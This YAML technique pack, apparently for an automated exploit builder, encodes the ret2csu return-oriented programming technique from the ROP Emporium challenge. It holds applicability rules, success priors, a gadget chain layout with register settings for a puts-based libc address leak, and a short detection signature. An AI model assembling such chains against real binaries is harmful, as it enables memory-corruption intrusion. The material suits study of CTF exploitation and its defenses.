# Canonique: le modele de technique pack pour agents et operateurs.
# Structure, vocabulaire et limites: voir docs/pack-format.md.
technique: ret2csu_v2
author: Gregory Epp
source: https://ropemporium.com/challenge/ret2csu.html

rules:
  - id: app_ret2csu_v2
    head: [applicable, ret2csu_v2]
    conditions:
      - [fact, vuln, sof]
      - [fact, nx, true]
      - [match, gadget, 0, csu]

kb:
  - id: ret2csu_v2_001
    technique: ret2csu_v2
    description: >
      __libc_csu_init universal gadget populates rdx/rsi/rdi in
      gadget-sparse binaries; the popper and mov gadgets enable
      controlled multi-argument calls.
    chain: [csu_popper, csu_mov, target_fn]
    unlocks: [libc_base]
    success_rate: 0.75

mcts:
  requires: []
  provides: [libc_base]
  terminal: false
  success: 0.70

priors: [14, 6]

# The assembly order, resolved by lictor's builder from the facts: the
# csu popper sets rbx=0, rbp=1, r12=fn@got, r13=arg2, r14=arg1, r15=arg0
# then csu_mov issues mov rdx,r13 / mov rsi,r14 / mov edi,r15d / call
# [r12+rbx*8]; 7 junk qwords fall through the second pop; the chain
# ends on the technique that follows (leak:main keeps the process
# alive). The arg values here are the canonical puts(puts@got) leak;
# an operator edits the consts for their call.
build:
  technique: ret2csu_v2
  layout:
    - [padding, measured_offset]
    - [chain, "gadget:csu_popper", "const:0", "const:1", "got_addr:puts",
       "const:8", "got_addr:puts", "const:1", "gadget:csu_mov",
       "const:0", "const:0", "const:0", "const:0", "const:0", "const:0", "const:0"]


# The defender side (the corpus read backwards): what this technique
# looks like to the defenses. Armored by check 9.
detection:
  - channel: crash
    signature: "call through __libc_csu_init gadget territory on a gadget-poor binary"
    note: "the csu chain issuing calls"
